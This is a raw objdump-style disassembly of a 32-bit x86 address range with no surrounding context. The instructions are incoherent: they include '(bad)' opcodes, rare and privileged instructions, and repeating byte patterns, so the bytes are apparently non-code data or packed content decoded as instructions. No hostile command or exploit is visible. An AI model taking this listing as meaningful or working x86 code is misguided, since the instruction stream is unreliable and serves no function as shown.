  4176ba:	cmp    al,BYTE PTR [esi+0x30a83b50]
  4176c0:	mov    BYTE PTR [ecx+0x59],0x25
  4176c4:	adc    eax,0x1281284
  4176c9:	mov    cl,0x40
  4176cb:	test   ebx,0xbd400137
  4176d1:	and    eax,0x436241
  4176d6:	adc    BYTE PTR [eax+0x0],al
  4176d9:	add    eax,0x62410040
  4176de:	inc    eax
  4176df:	add    BYTE PTR [ebx-0x34],al
  4176e2:	inc    eax
  4176e3:	add    eax,0x78434040
  4176e8:	bound  eax,QWORD PTR [ecx+0x78]
  4176eb:	add    eax,0x62404043
  4176f0:	push   ebx
  4176f1:	mov    esp,0x54344905
  4176f6:	xor    DWORD PTR [edi+ebx*2],esp
  4176f9:	dec    edx
  4176fa:	xchg   BYTE PTR [ebx+0x5e6ccd56],ch
  417700:	inc    edx
  417701:	xor    eax,0xbc4f4624
  417706:	cmp    ah,BYTE PTR [edi+0x41f6411c]
  41770c:	pushf  
  41770d:	or     eax,0x4041bb43
  417712:	add    eax,0x43436240
  417717:	add    eax,0x62004040
  41771c:	inc    eax
  41771d:	add    BYTE PTR [ecx+0x40],al
  417720:	inc    ebx
  417721:	test   BYTE PTR ds:0x58054041,ah
  417727:	inc    eax
  417728:	inc    eax
  417729:	bound  eax,QWORD PTR [eax+0x66]
  41772c:	inc    ecx
  41772d:	inc    eax
  41772e:	add    eax,0x5712c00
  417733:	and    BYTE PTR [ebx+ecx*8-0x2f],dl
  417737:	cwde   
  417738:	cmp    eax,DWORD PTR [ecx-0x7a]
  41773b:	mov    ah,0x23
  41773d:	mov    al,0x10
  41773f:	sub    DWORD PTR [ebx],esi
  417741:	arpl   WORD PTR [ebx],di
  417743:	add    eax,0xa08f4c25
  417748:	cmp    eax,0x5487f540
  41774d:	ret    
  41774e:	cli    
  41774f:	mov    eax,DWORD PTR [edi+0x60]
  417752:	add    eax,0x5d4b049
  417757:	push   cs
  417758:	mov    al,0x0
  41775a:	add    BYTE PTR [ebx+0x40],al
  41775d:	bound  eax,QWORD PTR ds:0x25404110
  417763:	add    ah,cl
  417765:	inc    ebx
  417766:	add    eax,0x40402562
  41776b:	add    BYTE PTR [eax+0x40],al
  41776e:	inc    ecx
  41776f:	inc    ecx
  417770:	add    eax,0x78434025
  417775:	bound  eax,QWORD PTR [eax-0x7c]
  417778:	inc    eax
  417779:	inc    ecx
  41777a:	inc    ecx
  41777b:	xchg   BYTE PTR [esi],dh
  41777d:	cmp    al,0x63
  41777f:	inc    ecx
  417780:	into   
  417781:	jp     0x4177c3
  417783:	pusha  
  417784:	inc    edx
  417785:	push   0x43184360
  41778a:	sub    al,0xf4
  41778c:	(bad)  
  41778d:	dec    edi
  41778e:	inc    ecx
  41778f:	inc    eax
  417790:	inc    eax
  417791:	inc    ebx
  417792:	int3   
  417793:	add    BYTE PTR ds:0x56240,al
  417799:	inc    ebx
  41779a:	inc    eax
  41779b:	inc    eax
  41779c:	add    BYTE PTR [ecx+0x62],al
  41779f:	bound  eax,QWORD PTR [eax]
  4177a1:	int3   
  4177a2:	inc    eax
  4177a3:	inc    ebx
  4177a4:	add    eax,0x43624041
  4177a9:	adc    BYTE PTR [ecx+0x5],al
  4177ac:	inc    eax
  4177ad:	sub    BYTE PTR [eax],dh
  4177af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177b0:	mov    al,0x57
  4177b2:	add    eax,0x2412dc24
  4177b7:	or     DWORD PTR [eax+eax*2],ebp
  4177ba:	xchg   BYTE PTR [ecx-0x52bfae9f],bh
  4177c0:	mov    BYTE PTR [edi],dl
  4177c2:	xor    al,0xc1
  4177c4:	pushf  
  4177c5:	div    BYTE PTR [ecx]
  4177c7:	push   ds
  4177c8:	icebp  
  4177c9:	stos   BYTE PTR es:[edi],al
  4177ca:	repz mov esp,0xca6c4f66
  4177d0:	(bad)  
  4177d1:	bound  eax,QWORD PTR [ebx+0x40]
  4177d4:	adc    BYTE PTR ds:0x4158cc40,al
  4177da:	inc    ebx
  4177db:	bound  eax,QWORD PTR [ecx+0x40]
  4177de:	add    eax,0x4140
  4177e3:	and    eax,0x40400062
  4177e8:	add    eax,0x84404340
  4177ed:	int3   
  4177ee:	js     0x4177f0
  4177f0:	inc    ecx
  4177f1:	adc    BYTE PTR [edx+0xf],ah
  4177f4:	inc    eax
  4177f5:	add    eax,0xd7b8400d
  4177fa:	rcl    BYTE PTR [ecx],1
  4177fc:	das    
  4177fd:	xchg   BYTE PTR [ebx+0x28],ch
  417800:	inc    esp
  417801:	inc    ebx
  417802:	xor    al,0x50
  417804:	jae    0x41782b
  417806:	push   eax
  417807:	push   edx
  417808:	rcl    cl,cl
  41780a:	pop    ss
  41780b:	test   DWORD PTR [eax-0xe],0x54de0d
  417812:	inc    eax
  417813:	inc    ecx
  417814:	inc    eax
  417815:	inc    ebx
  417816:	bound  ax,DWORD PTR ds:0x40434100
  41781d:	add    eax,0x40054062
  417822:	bound  eax,QWORD PTR [ecx+0x40]
  417825:	inc    ebx
  417826:	inc    eax
  417827:	add    eax,0x25405841
  41782c:	bound  eax,QWORD PTR [eax+0x43]
  41782f:	inc    eax
  417830:	adc    BYTE PTR [ecx+0x530489b],ah
  417836:	retf   
  417837:	fsub   QWORD PTR [ebx-0x31]
  41783a:	push   0x72
  41783c:	inc    eax
  41783d:	xchg   BYTE PTR [eax],ah
  41783f:	mov    esi,0xefaa236b
  417844:	cmp    DWORD PTR [ebx],esi
  417846:	xor    al,0xf1
  417848:	xor    ebx,DWORD PTR [edx]
  41784a:	jae    0x417880
  41784c:	dec    ebp
  41784d:	icebp  
  41784e:	push   eax
  41784f:	fnstenv [ecx+eax*2+0x540500e]
  417856:	add    eax,0x434140ec
  41785b:	inc    eax
  41785c:	add    eax,0x43406262
  417861:	inc    ecx
  417862:	adc    BYTE PTR [eax],al
  417864:	inc    eax
  417865:	add    eax,0x43000562
  41786a:	add    BYTE PTR [ecx+0x40],al
  41786d:	inc    eax
  41786e:	add    eax,0x400062
  417873:	inc    ebx
  417874:	inc    eax
  417875:	js     0x4178b8
  417877:	inc    ecx
  417878:	bound  eax,QWORD PTR [eax-0x3e]
  41787b:	inc    ebx
  41787c:	leave  
  41787d:	jo     0x417882
  41787f:	xchg   BYTE PTR [ebx+0x0],bh
  417882:	sbb    esi,DWORD PTR [eax]
  417884:	inc    eax
  417885:	and    eax,0x69bc6f62
  41788a:	arpl   WORD PTR [eax],sp
  41788c:	inc    eax
  41788d:	push   ecx
  41788e:	push   ebx
  41788f:	lock add eax,0x40400458
  417895:	mov    cl,0x41
  417897:	add    eax,0x313443cb
  41789c:	add    al,0x43
  41789e:	inc    ecx
  41789f:	xchg   BYTE PTR [ebp-0x23],cl
  4178a2:	sub    BYTE PTR [eax+eax*2-0x10],0x40
  4178a7:	pusha  
  4178a8:	add    eax,DWORD PTR ds:0x2740f4c3
  4178ae:	sub    eax,0x41054062
  4178b3:	add    BYTE PTR [ebx+0x40],al
  4178b6:	inc    eax
  4178b7:	inc    ecx
  4178b8:	inc    eax
  4178b9:	inc    eax
  4178ba:	bound  eax,QWORD PTR ds:0x5624300
  4178c0:	add    BYTE PTR [eax+0x40],al
  4178c3:	add    BYTE PTR [ecx+0x43],al
  4178c6:	add    BYTE PTR [eax+0x41],al
  4178c9:	add    eax,0x40436200
  4178ce:	inc    eax
  4178cf:	add    eax,0xa884ef62
  4178d4:	mov    al,0x43
  4178d6:	inc    eax
  4178d7:	or     ah,BYTE PTR [ebx]
  4178d9:	add    eax,0xd10f1039
  4178de:	or     al,0xf3
  4178e0:	inc    eax
  4178e1:	xchg   ah,ch
  4178e3:	mov    esp,0x4e4013ef
  4178e8:	inc    ecx
  4178e9:	inc    eax
  4178ea:	add    eax,0x41624340
  4178ef:	test   BYTE PTR [eax],al
  4178f1:	and    eax,0x404043
  4178f6:	add    BYTE PTR ds:0x626210,al
  4178fc:	add    eax,0x43404140
  417901:	inc    eax
  417902:	inc    ecx
  417903:	add    eax,0x10664062
  417908:	inc    ebx
  417909:	bound  esi,QWORD PTR [edx]
  41790b:	xor    al,0x63
  41790d:	inc    ecx
  41790e:	sub    BYTE PTR [bp+si],dl
  417911:	shl    BYTE PTR [edi-0x12],cl
  417914:	rcl    DWORD PTR ds:0x1b40760d,1
  41791a:	inc    eax
  41791b:	add    eax,0x5bcb30dc
  417920:	adc    eax,0xe0862f38
  417925:	or     al,0x52
  417927:	inc    ecx
  417928:	inc    eax
  417929:	inc    edx
  41792a:	or     eax,DWORD PTR ds:0x4041cc
  417930:	add    BYTE PTR [eax],al
  417932:	inc    eax
  417933:	inc    eax
  417934:	inc    ebx
  417935:	bound  eax,QWORD PTR [eax]
  417937:	inc    eax
  417938:	inc    eax
  417939:	add    eax,0x62434162
  41793e:	inc    eax
  41793f:	js     0x417951
  417941:	inc    ecx
  417942:	add    eax,0x5404325
  417947:	bound  eax,QWORD PTR [eax+0x40]
  41794a:	inc    ecx
  41794b:	inc    ebx
  41794c:	sub    DWORD PTR [ecx],ebp
  41794e:	cwde   
  41794f:	stos   DWORD PTR es:[edi],eax
  417950:	inc    edi
  417951:	outs   dx,BYTE PTR ds:[esi]
  417952:	xor    DWORD PTR [eax-0x13],eax
  417955:	lods   eax,DWORD PTR ds:[esi]
  417956:	push   0x47402441
  41795b:	xchg   ebp,eax
  41795c:	add    eax,0x1c7f2c62
  417961:	push   cs
  417962:	ficom  WORD PTR [eax]
  417964:	xchg   BYTE PTR [edx+0x40409030],dl
  41796a:	ss inc edi
  41796c:	and    al,0x50
  41796e:	jae    0x4179d5
  417970:	xor    DWORD PTR [edi],ecx
  417972:	push   edx
  417973:	and    eax,0x436241
  417978:	adc    BYTE PTR [eax+0x0],al
  41797b:	add    eax,0x62410040
  417980:	inc    eax
  417981:	add    BYTE PTR [ebx-0x34],al
  417984:	inc    eax
  417985:	add    eax,0x78434040
  41798a:	bound  eax,QWORD PTR [ecx+0x78]
  41798d:	add    eax,0x62404043
  417992:	inc    eax
  417993:	in     al,dx
  417994:	and    eax,0x406cfdfc
  417999:	push   ecx
  41799a:	xor    eax,DWORD PTR ds:0x91d441c8
  4179a0:	or     DWORD PTR [ecx-0x6],eax
  4179a3:	xchg   al,dl
  4179a5:	bound  ebx,QWORD PTR [ebx+eax*2+0x40]
  4179a9:	cmp    DWORD PTR [ebx+0x25],eax
  4179ac:	inc    esp
  4179ad:	sbb    edi,DWORD PTR [ecx+edx*8-0x14e502ec]
  4179b4:	xor    dl,al
  4179b6:	add    eax,DWORD PTR [bx+si-0xb]
  4179ba:	inc    eax
  4179bb:	add    eax,0x288e5507
  4179c0:	add    esp,DWORD PTR [ecx]
  4179c2:	es xchg al,dh
  4179c5:	test   al,0x9c
  4179c7:	pop    esp
  4179c8:	inc    ecx
  4179c9:	inc    eax
  4179ca:	add    eax,0x43436240
  4179cf:	add    eax,0x62004040
  4179d4:	inc    eax
  4179d5:	add    BYTE PTR [ecx+0x40],al
  4179d8:	inc    ebx
  4179d9:	test   BYTE PTR ds:0x58054041,ah
  4179df:	inc    eax
  4179e0:	inc    eax
  4179e1:	bound  eax,QWORD PTR [eax+0x66]
  4179e4:	inc    ecx
  4179e5:	inc    eax
  4179e6:	add    eax,0x40124000
  4179eb:	and    al,0xc5
  4179ed:	cmp    al,0x62
  4179ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179f0:	adc    eax,0x44ea2c2f
  4179f5:	jmp    0x518:0x7c4028c4
  4179fc:	loopne 0x417a62
  4179fe:	dec    edi
  4179ff:	inc    edx
  417a00:	adc    dl,BYTE PTR [edi+0x4e]
  417a03:	xchg   BYTE PTR [eax+0x22],dl
  417a06:	int3   
  417a07:	ins    DWORD PTR es:[edi],dx
  417a08:	inc    eax
  417a09:	xchg   ecx,eax
  417a0a:	inc    eax
  417a0b:	and    ebp,DWORD PTR [eax+ebp*2]
  417a0e:	cmp    BYTE PTR [esp+edx*1],0x45
  417a12:	or     cl,ch
  417a14:	pushf  
  417a15:	bound  edi,QWORD PTR [esi]
  417a17:	bound  eax,QWORD PTR [eax-0x4c]
  417a1a:	loop   0x417a21
  417a1c:	adc    eax,0xf840
  417a21:	inc    ebx
  417a22:	inc    eax
  417a23:	bound  eax,QWORD PTR ds:0x25404110
  417a29:	add    ah,cl
  417a2b:	inc    ebx
  417a2c:	add    eax,0x40402562
  417a31:	add    BYTE PTR [eax+0x40],al
  417a34:	inc    ecx
  417a35:	inc    ecx
  417a36:	add    eax,0x78434025
  417a3b:	bound  eax,QWORD PTR [eax-0x7c]
  417a3e:	inc    eax
  417a3f:	inc    ecx
  417a40:	inc    esp
  417a41:	adc    esp,DWORD PTR [edx+0x48]
  417a44:	xchg   cl,cl
  417a46:	pop    ecx
  417a47:	fs push eax
  417a49:	inc    eax
  417a4a:	inc    edx
  417a4b:	js     0x417a6f
  417a4d:	push   eax
  417a4e:	sub    BYTE PTR [ebx],dh
  417a50:	imul   ecx,DWORD PTR [esi],0x30
  417a53:	inc    eax
  417a54:	call   0xabea486e
  417a59:	inc    eax
  417a5a:	ja     0x417ad0
  417a5c:	in     al,0xcb
  417a5e:	cmp    esp,DWORD PTR [eax-0x52]
  417a61:	or     DWORD PTR [eax+0x40],eax
  417a64:	inc    eax
  417a65:	inc    ebx
  417a66:	adc    edi,DWORD PTR [ecx]
  417a68:	inc    ebx
  417a69:	inc    eax
  417a6a:	add    esi,DWORD PTR [eax-0x60]
  417a6d:	or     eax,0x43404041
  417a72:	int3   
  417a73:	add    BYTE PTR ds:0x56240,al
  417a79:	inc    ebx
  417a7a:	inc    eax
  417a7b:	inc    eax
  417a7c:	add    BYTE PTR [ecx+0x62],al
  417a7f:	bound  eax,QWORD PTR [eax]
  417a81:	int3   
  417a82:	inc    eax
  417a83:	inc    ebx
  417a84:	add    eax,0x43624041
  417a89:	adc    BYTE PTR [ecx+0x5],al
  417a8c:	inc    eax
  417a8d:	test   bh,ah
  417a8f:	rcr    BYTE PTR [edi],cl
  417a91:	sub    al,ah
  417a93:	mov    esp,0x18621a40
  417a98:	inc    eax
  417a99:	inc    edx
  417a9a:	inc    eax
  417a9b:	arpl   WORD PTR [edx+0x9],sp
  417a9e:	jecxz  0x417ae1
  417aa0:	adc    al,0x10
  417aa2:	jb     0x417a59
  417aa4:	adc    BYTE PTR ds:0x14025c5,0x40
  417aab:	mov    BYTE PTR ds:0x10114f65,0x47
  417ab2:	ins    DWORD PTR es:[edi],dx
  417ab3:	dec    edi
  417ab4:	xchg   DWORD PTR [eax+edx*2+0x41],ecx
  417ab8:	inc    eax
  417ab9:	jo     0x417afb
  417abb:	inc    ebp
  417abc:	xchg   ecx,eax
  417abd:	push   cs
  417abe:	mov    ah,0x47
  417ac0:	sbb    DWORD PTR [ebp+0x1],esi
  417ac3:	bound  eax,QWORD PTR [ebx+0x40]
  417ac6:	adc    BYTE PTR ds:0x4158cc40,al
  417acc:	inc    ebx
  417acd:	bound  eax,QWORD PTR [ecx+0x40]
  417ad0:	add    eax,0x4140
  417ad5:	and    eax,0x40400062
  417ada:	add    eax,0x84404340
  417adf:	int3   
  417ae0:	js     0x417ae2
  417ae2:	inc    ecx
  417ae3:	adc    BYTE PTR [edx+0xf],ah
  417ae6:	inc    ecx
  417ae7:	mov    edi,0x4024428d
  417aec:	inc    eax
  417aed:	inc    eax
  417aee:	cld    
  417aef:	ins    BYTE PTR es:[edi],dx
  417af0:	bound  edi,QWORD PTR [edx]
  417af2:	adc    al,0x12
  417af4:	arpl   WORD PTR [ebx],dx
  417af6:	pop    esp
  417af7:	or     ch,ch
  417af9:	inc    esp
  417afa:	inc    eax
  417afb:	inc    eax
  417afc:	inc    eax
  417afd:	inc    eax
  417afe:	bound  eax,QWORD PTR [eax+eax*1+0x40]
  417b02:	inc    ecx
  417b03:	inc    eax
  417b04:	inc    ebx
  417b05:	bound  ax,DWORD PTR ds:0x40434100
  417b0c:	add    eax,0x40054062
  417b11:	bound  eax,QWORD PTR [ecx+0x40]
  417b14:	inc    ebx
  417b15:	inc    eax
  417b16:	add    eax,0x25405841
  417b1b:	bound  eax,QWORD PTR [eax+0x43]
  417b1e:	inc    eax
  417b1f:	adc    BYTE PTR [ebx+eiz*2+0x407a0331],bh
  417b26:	clc    
  417b27:	dec    ebx
  417b28:	push   0xffffffed
  417b2a:	ins    BYTE PTR es:[edi],dx
  417b2b:	inc    eax
  417b2c:	loopne 0x417b40
  417b2e:	ret    
  417b2f:	xor    BYTE PTR [ebx+0x33],ch
  417b32:	dec    ebx
  417b33:	add    eax,0x2cbf7e54
  417b38:	inc    eax
  417b39:	inc    ecx
  417b3a:	inc    ebx
  417b3b:	inc    eax
  417b3c:	add    eax,0x43406262
  417b41:	inc    ecx
  417b42:	adc    BYTE PTR [eax],al
  417b44:	inc    eax
  417b45:	add    eax,0x43000562
  417b4a:	add    BYTE PTR [ecx+0x40],al
  417b4d:	inc    eax
  417b4e:	add    eax,0x400062
  417b53:	inc    ebx
  417b54:	inc    eax
  417b55:	js     0x417b98
  417b57:	inc    ecx
  417b58:	bound  eax,QWORD PTR [eax-0x24]
  417b5b:	fld    DWORD PTR [ebx+0x40]
  417b5e:	inc    DWORD PTR [eax-0x41]
  417b61:	test   al,0x8f
  417b63:	arpl   cx,dx
  417b65:	add    al,0x4c
  417b67:	daa    
  417b68:	fst    QWORD PTR [eax]
  417b6a:	dec    esp
  417b6b:	into   
  417b6c:	addr16 inc eax
  417b6e:	push   esp
  417b6f:	inc    eax
  417b70:	test   DWORD PTR [eax+0x40eefc6d],eax
  417b76:	gs cs test al,0x5
  417b7a:	inc    esi
  417b7b:	sub    eax,DWORD PTR fs:[eax+0x44]
  417b7f:	mov    BYTE PTR [ebp+ecx*8-0x14],0xa8
  417b84:	addr16 inc eax
  417b86:	rol    DWORD PTR [eax-0x37],1
  417b89:	inc    eax
  417b8a:	push   edx
  417b8b:	inc    eax
  417b8c:	sub    BYTE PTR [edx+0x40],ah
  417b8f:	add    eax,0x40430041
  417b94:	inc    eax
  417b95:	inc    ecx
  417b96:	inc    eax
  417b97:	inc    eax
  417b98:	bound  eax,QWORD PTR ds:0x5624300
  417b9e:	add    BYTE PTR [eax+0x40],al
  417ba1:	add    BYTE PTR [ecx+0x43],al
  417ba4:	add    BYTE PTR [eax+0x41],al
  417ba7:	add    eax,0x40436200
  417bac:	inc    eax
  417bad:	add    eax,0x2c4d4062
  417bb2:	shr    BYTE PTR [edx],0x38
  417bb5:	inc    eax
  417bb6:	inc    edx
  417bb7:	or     al,0xdc
  417bb9:	bound  esp,QWORD PTR [ebx+0x68]
  417bbc:	xchg   ebp,eax
  417bbd:	ror    BYTE PTR [edi],0x40
  417bc0:	bound  esp,QWORD PTR [edx-0x1c]
  417bc3:	inc    esi
  417bc4:	push   edx
  417bc5:	inc    ebx
  417bc6:	push   esp
  417bc7:	or     eax,0x191c4040
  417bcc:	cli    
  417bcd:	sub    BYTE PTR [edx+0x40],ah
  417bd0:	jge    0x417c05
  417bd2:	sub    eax,0x40054041
  417bd7:	inc    ebx
  417bd8:	bound  eax,QWORD PTR [ecx-0x7c]
  417bdb:	add    BYTE PTR ds:0x404043,ah
  417be1:	add    BYTE PTR ds:0x626210,al
  417be7:	add    eax,0x43404140
  417bec:	inc    eax
  417bed:	inc    ecx
  417bee:	add    eax,0x10664062
  417bf3:	inc    ebx
  417bf4:	bound  eax,QWORD PTR [eax+0x70]
  417bf7:	inc    ebx
  417bf8:	inc    eax
  417bf9:	adc    al,0x98
  417bfb:	push   edx
  417bfc:	mov    bl,0x62
  417bfe:	fs push 0x40414030
  417c04:	add    ah,BYTE PTR [ebp+0x86c34ac]
  417c0a:	idiv   DWORD PTR [eax+ebp*4+0x681258a9]
  417c11:	inc    eax
  417c12:	add    eax,DWORD PTR [eax+0x10]
  417c15:	mov    eax,0x6e43a262
  417c1a:	xor    ch,BYTE PTR [esp+edx*4]
  417c1d:	sub    cl,BYTE PTR [eax+0x5]
  417c20:	int3   
  417c21:	inc    ecx
  417c22:	inc    eax
  417c23:	add    BYTE PTR [eax],al
  417c25:	add    BYTE PTR [eax+0x40],al
  417c28:	inc    ebx
  417c29:	bound  eax,QWORD PTR [eax]
  417c2b:	inc    eax
  417c2c:	inc    eax
  417c2d:	add    eax,0x62434162
  417c32:	inc    eax
  417c33:	js     0x417c45
  417c35:	inc    ecx
  417c36:	add    eax,0x5404325
  417c3b:	bound  eax,QWORD PTR [eax+0x40]
  417c3e:	inc    ecx
  417c3f:	inc    ebx
  417c40:	xchg   ecx,eax
  417c41:	rol    DWORD PTR [eax+0x24],1
  417c44:	inc    eax
  417c45:	inc    edx
  417c46:	aas    
  417c47:	inc    edx
  417c48:	dec    esp
  417c49:	add    al,0xe
  417c4b:	dec    ecx
  417c4c:	sub    BYTE PTR [edi],al
  417c4e:	and    DWORD PTR fs:0xe05240d1,edx
  417c55:	sub    BYTE PTR [ebx+0x5c],al
  417c58:	retf   
  417c59:	icebp  
  417c5a:	(bad)  
  417c5c:	inc    eax
  417c5d:	inc    eax
  417c5e:	jl     0x417c75
  417c60:	adc    DWORD PTR [esi+0x40],esp
  417c63:	push   esp
  417c64:	and    edi,DWORD PTR [ebx+0x41acd873]
  417c6a:	or     DWORD PTR ds:0x436241,esp
  417c70:	adc    BYTE PTR [eax+0x0],al
  417c73:	add    eax,0x62410040
  417c78:	inc    eax
  417c79:	add    BYTE PTR [ebx-0x34],al
  417c7c:	inc    eax
  417c7d:	add    eax,0x78434040
  417c82:	bound  eax,QWORD PTR [ecx+0x78]
  417c85:	add    eax,0x62404043
  417c8a:	mov    ebp,0x5e000540
  417c8f:	inc    ebp
  417c90:	inc    edi
  417c91:	inc    eax
  417c92:	push   esi
  417c93:	xor    eax,DWORD PTR [esi+0x24596359]
  417c99:	adc    al,0x51
  417c9b:	sbb    al,0x34
  417c9d:	fld    QWORD PTR [ebp-0x6c]
  417ca0:	or     al,0x40
  417ca2:	inc    esp
  417ca3:	inc    edx
  417ca4:	mov    edx,0x406b3076
  417ca9:	add    esi,DWORD PTR [edi+0x44800516]
  417caf:	ins    BYTE PTR es:[edi],dx
  417cb0:	xor    DWORD PTR [eax-0x69],eax
  417cb3:	cmp    al,0x86
  417cb5:	ja     0x417cfc
  417cb7:	int3   
  417cb8:	ins    BYTE PTR es:[edi],dx
  417cb9:	inc    ecx
  417cba:	inc    eax
  417cbb:	add    eax,0x43436240
  417cc0:	add    eax,0x62004040
  417cc5:	inc    eax
  417cc6:	add    BYTE PTR [ecx+0x40],al
  417cc9:	inc    ebx
  417cca:	test   BYTE PTR ds:0x58054041,ah
  417cd0:	inc    eax
  417cd1:	inc    eax
  417cd2:	bound  eax,QWORD PTR [eax+0x66]
  417cd5:	inc    ecx
  417cd6:	inc    eax
  417cd7:	add    eax,0x44401500
  417cdc:	and    eax,0x5bed190
  417ce1:	inc    eax
  417ce2:	push   esp
  417ce3:	sub    edi,DWORD PTR [ecx+0x43dc58c7]
  417ce9:	adc    dh,BYTE PTR [eax+0x4a]
  417cec:	add    eax,0xd1a5452c
  417cf1:	inc    eax
  417cf2:	inc    eax
  417cf3:	xchg   BYTE PTR fs:[eax+0xa931],dh
  417cfa:	inc    ebx
  417cfb:	inc    eax
  417cfc:	bound  eax,QWORD PTR ds:0x25404110
  417d02:	add    ah,cl
  417d04:	inc    ebx
  417d05:	add    eax,0x40402562
  417d0a:	add    BYTE PTR [eax+0x40],al
  417d0d:	inc    ecx
  417d0e:	inc    ecx
  417d0f:	add    eax,0x78434025
  417d14:	bound  eax,QWORD PTR [eax-0x7c]
  417d17:	inc    eax
  417d18:	inc    ecx
  417d19:	cmp    dl,BYTE PTR [eax+edx*2]
  417d1c:	inc    eax
  417d1d:	sub    DWORD PTR [ebx],esp
  417d1f:	sub    al,0xa8
  417d21:	out    0x40,eax
  417d23:	js     0x417d46
  417d25:	mov    eax,0xf668241d
  417d2a:	adc    eax,DWORD PTR [esp+esi*2+0x5]
  417d2e:	arpl   WORD PTR [edx-0x1],cx
  417d31:	fild   DWORD PTR [eax-0x7]
  417d34:	inc    eax
  417d35:	xchg   BYTE PTR [edi-0x3c],cl
  417d38:	ins    DWORD PTR es:[edi],dx
  417d39:	sub    BYTE PTR [esi],cl
  417d3b:	inc    ecx
  417d3c:	inc    eax
  417d3d:	inc    eax
  417d3e:	inc    ebx
  417d3f:	int3   
  417d40:	add    BYTE PTR ds:0x56240,al
  417d46:	inc    ebx
  417d47:	inc    eax
  417d48:	inc    eax
  417d49:	add    BYTE PTR [ecx+0x62],al
  417d4c:	bound  eax,QWORD PTR [eax]
  417d4e:	int3   
  417d4f:	inc    eax
  417d50:	inc    ebx
  417d51:	add    eax,0x43624041
  417d56:	adc    BYTE PTR [ecx+0x5],al
  417d59:	inc    eax
  417d5a:	inc    ebp
  417d5b:	xor    esi,DWORD PTR ds:0x42458133
  417d61:	inc    eax
  417d62:	fcomp  DWORD PTR [edi+esi*4+0x51]
  417d66:	push   es
  417d67:	cld    
  417d68:	or     DWORD PTR [ecx],ecx
  417d6a:	jno    0x417dac
  417d6c:	add    eax,0x9c6aa863
  417d71:	inc    eax
  417d72:	dec    ecx
  417d73:	bound  eax,QWORD PTR [ebx+0x40]
  417d76:	adc    BYTE PTR ds:0x4158cc40,al
  417d7c:	inc    ebx
  417d7d:	bound  eax,QWORD PTR [ecx+0x40]
  417d80:	add    eax,0x4140
  417d85:	and    eax,0x40400062
  417d8a:	add    eax,0x84404340
  417d8f:	int3   
  417d90:	js     0x417d92
  417d92:	inc    ecx
  417d93:	adc    BYTE PTR [edx+0xf],ah
  417d96:	xor    al,BYTE PTR [esi+0x625c11b0]
  417d9c:	pop    ds
  417d9d:	sar    DWORD PTR [ecx+edx*1+0x5],1
  417da1:	mov    ah,0x4c
  417da3:	inc    eax
  417da4:	inc    eax
  417da5:	in     eax,dx
  417da6:	inc    edx
  417da7:	mov    dh,0xc9
  417da9:	inc    edx
  417daa:	jge    0x417ddc
  417dac:	adc    al,0x63
  417dae:	pusha  
  417daf:	add    eax,0x6c677591
  417db4:	inc    eax
  417db5:	mov    cl,0xea
  417db7:	xchg   BYTE PTR [ecx-0x54],al
  417dba:	push   0x88491022
  417dbf:	outs   dx,DWORD PTR ds:[esi]
  417dc0:	pop    ebx
  417dc1:	push   edx
  417dc2:	in     al,dx
  417dc3:	inc    edi
  417dc4:	inc    eax
  417dc5:	icebp  
  417dc6:	inc    eax
  417dc7:	mov    ch,0x28
  417dc9:	inc    edx
  417dca:	lds    ebx,FWORD PTR [bx+di]
  417dcd:	add    BYTE PTR [eax+0x41],al
  417dd0:	inc    eax
  417dd1:	inc    ebx
  417dd2:	bound  ax,DWORD PTR ds:0x40434100
  417dd9:	add    eax,0x40054062
  417dde:	bound  eax,QWORD PTR [ecx+0x40]
  417de1:	inc    ebx
  417de2:	inc    eax
  417de3:	add    eax,0x25405841
  417de8:	bound  eax,QWORD PTR [eax+0x43]
  417deb:	inc    eax
  417dec:	adc    BYTE PTR [ebx+0x29],bl
  417def:	add    eax,0xa71c92c
  417df4:	inc    eax
  417df5:	push   ecx
  417df6:	inc    eax
  417df7:	xchg   BYTE PTR [ebx],bl
  417df9:	mov    ah,0x38
  417dfb:	sbb    dl,BYTE PTR [edx]
  417dfd:	ins    BYTE PTR es:[edi],dx
  417dfe:	sub    eax,0x62b1ad60
  417e03:	fadd   DWORD PTR [eax-0x6f]
  417e06:	sub    BYTE PTR [edx+eiz*2+0x34ca367],dh
  417e0d:	dec    esp
  417e0e:	inc    esp
  417e0f:	add    eax,0x41586270
  417e14:	inc    eax
  417e15:	adc    eax,DWORD PTR [eax+0x41]
  417e18:	inc    ebx
  417e19:	inc    eax
  417e1a:	add    eax,0x43406262
  417e1f:	inc    ecx
  417e20:	adc    BYTE PTR [eax],al
  417e22:	inc    eax
  417e23:	add    eax,0x43000562
  417e28:	add    BYTE PTR [ecx+0x40],al
  417e2b:	inc    eax
  417e2c:	add    eax,0x400062
  417e31:	inc    ebx
  417e32:	inc    eax
  417e33:	js     0x417e76
  417e35:	inc    ecx
  417e36:	bound  eax,QWORD PTR [eax+0x24]
  417e39:	xchg   BYTE PTR [ecx+0x54362cb],cl
  417e3f:	push   eax
  417e40:	inc    eax
  417e41:	sub    al,0xff
  417e43:	dec    edx
  417e44:	enter  0x4030,0x91
  417e48:	xor    dh,BYTE PTR [ebx+0x44234ee]
  417e4e:	bound  eax,QWORD PTR [eax+0x5]
  417e51:	inc    ecx
  417e52:	add    BYTE PTR [ebx+0x40],al
  417e55:	inc    eax
  417e56:	inc    ecx
  417e57:	inc    eax
  417e58:	inc    eax
  417e59:	bound  eax,QWORD PTR ds:0x5624300
  417e5f:	add    BYTE PTR [eax+0x40],al
  417e62:	add    BYTE PTR [ecx+0x43],al
  417e65:	add    BYTE PTR [eax+0x41],al
  417e68:	add    eax,0x40436200
  417e6d:	inc    eax
  417e6e:	add    eax,0xc84c0462
  417e73:	add    eax,0x40290bb4
  417e78:	inc    eax
  417e79:	jnp    0x417ebb
  417e7b:	xchg   BYTE PTR ds:0x4031c75b,dl
  417e81:	pop    ecx
  417e82:	xor    eax,0xa862cb2c
  417e87:	ins    BYTE PTR es:[edi],dx
  417e88:	inc    eax
  417e89:	adc    DWORD PTR [eax-0x4e],eax
  417e8c:	adc    DWORD PTR [edx+0x10],ecx
  417e8f:	aas    
  417e90:	adc    al,0xbf
  417e92:	aaa    
  417e93:	add    eax,0x41acc950
  417e98:	inc    eax
  417e99:	add    eax,0x41624340
  417e9e:	test   BYTE PTR [eax],al
  417ea0:	and    eax,0x404043
  417ea5:	add    BYTE PTR ds:0x626210,al
  417eab:	add    eax,0x43404140
  417eb0:	inc    eax
  417eb1:	inc    ecx
  417eb2:	add    eax,0x10664062
